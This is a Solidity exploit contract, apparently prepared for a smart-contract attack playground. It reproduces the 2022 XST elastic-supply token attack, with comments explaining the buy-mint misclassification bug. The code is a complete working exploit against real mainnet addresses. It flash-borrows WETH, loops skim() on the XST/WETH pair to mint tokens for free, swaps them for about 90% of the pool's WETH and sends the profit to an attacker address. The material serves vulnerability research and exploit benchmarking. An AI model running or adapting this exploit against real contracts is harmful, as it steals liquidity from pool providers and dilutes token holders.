// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2022-08-XST).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the flash-swap callback `uniswapV2Call` lives on the test itself, so there is
// no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + uniswapV2Call + Refund), so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/XST_exp.sol.
//
// NOTE: the original test ends with `WETH.withdraw(WETHBalance)`. That is OMITTED
// here so the playground can score profit as the attacker's WETH (ERC20) delta —
// the WETH stays in the contract and is forwarded to ATTACKER at the end of the
// callback.
//
// Root cause: XStable2 is an elastic-supply token whose _transfer classifies any
// transfer FROM a registered AMM pool as a "buy" and MINTS new XST. The UniswapV2
// pair's skim() reconciliation calls XST.transfer(pair, balance−reserve) with the
// pair as msg.sender, so each skim(pair) is seen as a buy → mint that leaves the
// pair's balance above the stale reserve0; iterating skim() mints the pool's own
// reserve token geometrically for free. The attacker then dumps that minted XST
// for the pool's WETH at the stale price.

// VULNERABILITY: Buy-mint misclassification on pool-originated transfers (skim self-transfer)
// Detailed explanation:
// - XST token (0x91383A15C391c142b80045D8b4730C1c37ac0378, behind proxy) inherits elastic supply via rebasing
//   using _largeBalances / getFactor() where getFactor() = _largeTotal / _totalSupply (see XST2.sol:88, Getters2.sol:88).
// - In XST2._transfer (XST2.sol:129): 
//     if (isSupportedPool(sender)) { lpBurn = syncPair(sender); ... }
//     txType = _getTxType(sender, recipient, lpBurn);  // XST2.sol:149
// - _getTxType (XST2.sol:209): if (isSupportedPool(sender) && !lpBurn) return 1;  // BUY
// - txType==1 calls _implementBuy (XST2.sol:165) which:
//     _largeBalances[sender] -= ...; _largeBalances[recipient] += ...;
//     _largeBalances[stabilizer] += ...; _largeBalances[treasury] += ...; _totalSupply += totalMint;
//     (mint amounts from getMintValue using _poolCounters expansionR, XST2.sol:332)
// - Critically: sender is determined by _msgSender() inside XST (XST2.sol:130), i.e. the *caller* of XST.transfer().
// - UniswapV2Pair.skim(to) (UniswapV2Pair.sol:488):
//     _safeTransfer(token0, to, balanceOf(this) - reserve0);  // does token.call(transfer(to, excess))
//   When to == pair itself, this executes XST.transfer(pair, excess) with msg.sender == pair inside XST.
// - Thus: sender=pair (supported pool), recipient=pair --> lpBurn=false (LP supply unchanged), txType=1 --> BUY MINT.
// - Self-transfer has net-zero effect on pair's _largeBalances[pair] (sub then add), but _totalSupply increases.
// - Result: factor decreases --> all balanceOf() views inflate (including pair's reported XST bal).
// - Repeated skim(pair) in loop: each updates counters via syncPair (Getters2.sol:94 which reads real balanceOf), sees higher nominal via factor drop, triggers larger mints (amount param in getMintValue scales the mint).
// - Why geometric: lower factor -> higher balanceOf(pair) -> larger 'excess' in next skim calc -> larger 'amount' passed to buy-mint -> more totalSupply inflation.
// - No access control: ANY caller can cause pair to invoke skim(pair), and pair will originate the transfer.
// - Impact: Attacker mints unbounded XST "for free" (no WETH paid), inflates supply while keeping Uniswap reserves stale (no sync after skims), then skims the inflated excess XST out and swaps it for WETH using stale low-reserve0 price.
// - Material harm: Direct theft of all WETH liquidity from XST/WETH pair (0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); protocol's elastic mechanics subverted; holders' relative shares diluted via attacker-minted supply.

// EXPLOIT STEPS:
// 1. Flash-swap WETH from WETH/USDT pair (0x0d4a...) into attacker (uniswapV2Call receives it).
// 2. Transfer the flashed WETH into XST/WETH pair (manipulates its WETH balance for pricing calc).
// 3. Compute borrowXST using stale getReserves() and current bals; call pair.swap(borrowXST,0,this,"00") -- this pulls XST out (pair-originated transfer --> triggers buy-mint #1).
// 4. Call pair.sync() to update Uniswap reserves to current bals (after the borrow).
// 5. Transfer 1/8 of received XST back into pair (increases pair XST bal, creating 'excess' vs reserve).
// 6. Loop 15x: pair.skim(pair) -- each: self-transfer excess (pair as sender) --> txType=1 buy-mint, factor drops, reported bal inflates geometrically (no actual XST removed).
// 7. Refund(): pair.skim(this) -- skims the now-hugely-inflated excess XST to attacker (pair-originated transfer again triggers buy-mint).
// 8. Transfer the skimmed XST back to pair; read getReserves() (still relatively stale/low XST); swap out ~90% of WETH reserve.
// 9. Repay flash + fee to source pair; profit = drained WETH forwarded to ATTACKER.
// 10. (Omitted in this PoC: WETH.withdraw; profit measured as WETH ERC20 balance delta.)

// The core bug is the invariant violation: "transfers out of / from a pool must be user-initiated buys paying the other side" is NOT enforced; any internal pair call that does XST.transfer() with pair as from will mint.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function sync() external;
    function skim(address to) external;
}

contract XSTExploit {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant UniswapV20x694f = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C; // XST/WETH pair
    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;
    address constant UniswapV20x0d4a = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852; // WETH/USDT pair (flash source)
    address constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;

    function run() external {
        // VULNERABILITY TRIGGER: Flash WETH seed capital to manipulate the target pair's reserves/balances.
        uint256 balance = IERC20(WETH).balanceOf(UniswapV20x694f);
        IUniswapV2Pair(UniswapV20x0d4a).swap(balance * 2, 0, address(this), "0000");
        // forward the WETH profit to the receiver EOA (no withdraw: keep as WETH)
        uint256 weth = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(ATTACKER, weth);
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256("0000")) {
            uint256 balance = IERC20(WETH).balanceOf(address(this));
            IERC20(WETH).transfer(UniswapV20x694f, balance);
            uint256 uniswapETHBalance = IERC20(WETH).balanceOf(UniswapV20x694f);
            (uint256 amount0Out, uint256 amount1Out,) = IUniswapV2Pair(UniswapV20x694f).getReserves();
            uint256 borrowXST = amount0Out * balance / uniswapETHBalance;
            // This swap causes pair to _safeTransfer(XST, this, borrowXST) --> XST.transfer(pair_as_sender, this, amt)
            // --> triggers _transfer with sender=UniswapV20x694f (supported pool) --> txType=1 BUY MINT (XST2.sol:140,165).
            IUniswapV2Pair(UniswapV20x694f).swap(borrowXST, 0, address(this), "00");
            IUniswapV2Pair(UniswapV20x694f).sync();
            uint256 b1 = IERC20(XST).balanceOf(address(this));
            IERC20(XST).transfer(UniswapV20x694f, b1 / 8);
            // VULNERABILITY: Repeated self-skim to trigger geometric mints.
            // Each skim(pair) executes XST.transfer(pair, excess) with msg.sender=pair inside XST
            // (see UniswapV2Pair.skim:488 and _safeTransfer:340).
            // Because sender==supported pool && !lpBurn, _getTxType returns 1, _implementBuy mints.
            // Self-xfer net zero on pair bal; but mint increases _totalSupply, lowers factor,
            // inflates balanceOf(pair) view for next iteration's excess calc.
            for (uint8 i = 0; i < 15; ++i) {
                IUniswapV2Pair(UniswapV20x694f).skim(UniswapV20x694f);
            }
            Refund(amount0);
        }
    }

    function Refund(uint256 amount) internal {
        IUniswapV2Pair(UniswapV20x694f).skim(address(this));
        uint256 nowXSTBalance = IERC20(XST).balanceOf(address(this));
        IERC20(XST).transfer(UniswapV20x694f, nowXSTBalance);
        (uint256 a0Out, uint256 a1Out,) = IUniswapV2Pair(UniswapV20x694f).getReserves();
        uint256 swapAmount = a1Out * 9 / 10;
        IUniswapV2Pair(UniswapV20x694f).swap(0, swapAmount, address(this), "00");
        uint256 v = amount;
        uint256 fee = v * 4 / 1e3;
        uint256 refund = v + fee;
        IERC20(WETH).transfer(UniswapV20x0d4a, refund);
    }

    fallback() external payable {}
}
